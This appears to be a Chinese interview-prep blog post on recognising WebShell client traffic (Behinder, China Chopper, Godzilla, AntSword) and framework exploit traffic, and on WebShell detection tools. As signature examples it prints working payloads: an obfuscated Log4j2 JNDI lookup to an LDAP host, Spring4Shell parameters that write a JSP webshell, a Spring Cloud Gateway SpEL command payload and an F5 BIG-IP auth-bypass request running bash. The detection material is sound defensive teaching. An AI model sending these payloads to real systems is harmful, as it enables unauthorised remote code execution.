---
title: 渗透测试面试系列四：WebShell流量分析与框架漏洞检测
tags: [面试, 渗透测试, 流量分析, WebShell, 蚁剑, 冰蝎, 哥斯拉, 菜刀, Shiro, Fastjson, Log4j]
date: 2026-07-18
---

# 渗透测试面试系列四：WebShell流量分析与框架漏洞检测

<!-- more -->

## 冰蝎流量特征

### 3.0 版本

- 全程加密，JSP 文件
- Java 版本：Base64 解密 → AES-128 加密
- 弱特征：内置 25 个 UA 请求头（可修改源码）
- 弱特征：初始化的请求头部 `type` 属于固定值

### 2.0 版本

采用协商密钥机制：

1. 第一阶段请求中返回包状态码为 200，返回内容必定是 16 位的密钥
2. 密钥传递阶段：先通过 GET 方式请求服务端，URL 传递 `pass` 的整型参数，参数内容为随机数
3. 服务端响应包长度为 16，Body 内容为随机数 MD5 的 16 位作为密钥，**明文传递**

### 3.0 版本改进

去除了动态密钥协商机制，采用**预共享密钥**，全程无明文交互，密钥格式为 `md5("admin")[0:16]`。

---

## 菜刀流量特征

### 2011-2014 版本

**PHP 类 WebShell**（特征主要存在 Body 中）：

1. `eval` 函数或 `assert` 函数用于执行传递的攻击 payload
2. 使用 POST 或 GET 或 REQUEST 接收所传输的数据
3. `base64_decode` 函数解码传输的数据
4. 响应包存在 `->| |<-`，包含执行结果

**JSP 类 WebShell**：

- `i=A&z0=GB2312`，菜刀连接 JSP 木马时，第一个参数定义操作，参数值为 A-Q，如 `i=A`
- 第二个参数指定编码，如 `z0=GB2312`
- 有时候 `z0` 后面还会接着 `z1=`、`z2=` 参数用来加入攻击载荷
- 参数名 `i`、`z0`、`z1` 这种参数名是**会变的**，但参数值以及这种形式是不变的，第一个参数值在 A-Q 范围内不变

**ASP 类 WebShell**（特征主要存在于 Body 中）：

1. `execute` 函数用于执行传递的攻击 payload，等同于 `eval`
2. `On Error Resume Next`，这是大部分 ASP 客户端中必有的流量，保证不管前面出任何错，继续执行以下代码
3. `Response.Write` 和 `Response.End` 是必有的

### 2016 版本菜刀

最大的改变是将特征进行**打断混淆**：

- PHP：`base64_decode` 函数进行打断连接（`"ba"."se"."64"`）
- PHP：`@eval` 函数进行打断连接（`"@e"."v"."al"`）或 `assert` 函数
- JSP：同 2011-2014 版本
- ASP：Body 中 Unicode 编码替换混淆，直接进行 Unicode 解码即可

---

## 哥斯拉流量特征

### 工作原理

1. 基于流量，HTTP 全加密的 WebShell
2. AES 加密

### 流量特征

1. 低版本会有特征，是**强特征**
2. 发送一段固定代码（payload），HTTP 响应为空
3. 发送一段固定代码（test），执行结果为固定的
4. 发送一段固定代码（`getBacisInfo`）

---

## 蚁剑流量特征

| 维度 | 特征 |
|------|------|
| **Payload 位置** | Body 内 |
| **Body 参数内容** | `ini_set()` 函数、`set_time_limit()` 函数、`echo` 函数、`eval` 函数 |
| **UA 头** | `antsword/v2.1` |

### 编码方式与结果

| 编码方式 | 编码结果 |
|----------|---------|
| default | `@ini_s` |
| base64 | `QGluaV9z` |
| chr | `cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115)` |
| chr16 | `cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73)` |
| rot13 | `@vav_f` |

---

## 常见攻击流量特征速查

### Struts2 流量特征

1. GET、POST、Content-Type
2. `*.action` 文件 / `*.jsp` 文件
3. Java 开发
4. OGNL 表达式注入
5. `%{}`

### Shiro 反序列化流量特征

1. Cookie 传输
2. 响应头：`Set-Cookie: rememberMe=deleteMe`
3. 请求头：`rememberMe=cookie`
4. 参考 Java 反序列化流量特征（`AC ED 00 05`）
5. AES 加密
6. 550/721 的利用 Cookie 填充之后**很长**

### Shiro 权限绕过流量特征

1. 路径后面 `%2f`
2. 路径前面 `..;`

### Log4j2 流量特征

- `${}` 特征字符串
- JNDI 注入：`ldap`、`rmi`、`dns`、`ip`

**混淆绕过**：

1. 可以使用 `:-` 进行截取和赋值操作，分隔关键字：
   - `${${::-j}${::-n}${::-d}${::-i}:ldap://dns.log}`

2. 核心包里的 Lookup 可以用来获取系统信息：
   - `${hostName}`、`${env:USERDOMAIN}`、`${env:COMPUTERNAME}` 配合 DNSLog 快速定位受影响机器

### Log4j2 影响范围

Log4j 1.x、SpringBoot、Apache Struts2、Apache Solr、VMware 产品线、Apache Flink、Apache Druid。

---

## Spring 相关漏洞

### Spring Framework CVE-2022-22965

利用获取到的属性构造利用链，修改 Tomcat 中日志相关的属性，日志文件写入 WebShell 达到命令执行的目的。

**流量特征**：

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{cmd}i
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

### Spring Cloud Gateway

SpEL 表达式注入。

**流量特征**：

```
POST /actuator/gateway/refresh
GET /actuator/gateway/routes/EchoSec
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}
```

---

## F5 BIG-IP RCE (CVE-2022-1388)

未授权绕过 RCE。`X-F5-Auth-Token` 为空时走入另一条验证流程，而这个流程依赖于我们给 Header 提供的 `Authorization:` 字段。因为 Authorization 字段可控，并且没有复杂的加密处理，从而导致可以轻易绕过鉴权。

**流量特征**：

```
POST /mgmt/tm/util/bash
Content-Type: application/json
Connection: keep-alive, x-F5-Auth-Token
X-F5-Auth-Token: a
Authorization: Basic YWRtaW46
{"command":"run","utilCmdArgs":"-c id"}
```

---

## Fastjson 流量特征

1. JSON 数据传输
2. JSON 数据中 `@type`
3. Java 代码
4. RMI、LDAP 协议
5. 常见利用链（CC3、CC5）
6. 高危类

---

## 分块传输流量特征

POST 请求，请求头存在 `Transfer-Encoding: chunked` 字段。

## PHP 代码执行/命令执行函数

### 代码执行

| 函数 | 说明 |
|------|------|
| `eval()` | 字符串被当作 PHP 代码执行 |
| `assert()` | 与 `eval` 类似，字符串被当作 PHP 代码执行 |

### 命令执行

| 函数 | 说明 |
|------|------|
| `system()` | 有回显，将执行结果输出到页面上 |
| `passthru()` | 有回显，将执行结果输出到页面上 |
| `exec()` | 无回显，默认返回最后一行结果 |
| `shell_exec()` | 默认无回显，通过 `echo` 可将执行结果输出到页面 |
| `popen()` | 打开一个指向进程的管道 |
| `proc_open()` | 与 `popen` 类似，但可以提供双向管道 |
| `pcntl_exec()` | 在当前进程空间执行指定程序 |

---

## Webshell 检测思路

1. **静态检测**：匹配特征码、特征值、危险函数
2. **动态检测**：WAF、IDS 等设备
3. **日志检测**：通过 IP 访问规律、页面访问规律筛选
4. **文件完整性监控**

### 常用 WebShell 检测工具

1. D盾
2. 河马 WebShell
3. 百度 WEBDIR+
4. Web Shell Detector
5. Sangfor WebShellKill（深信服）
6. PHP Malware Finder（支持 Linux）
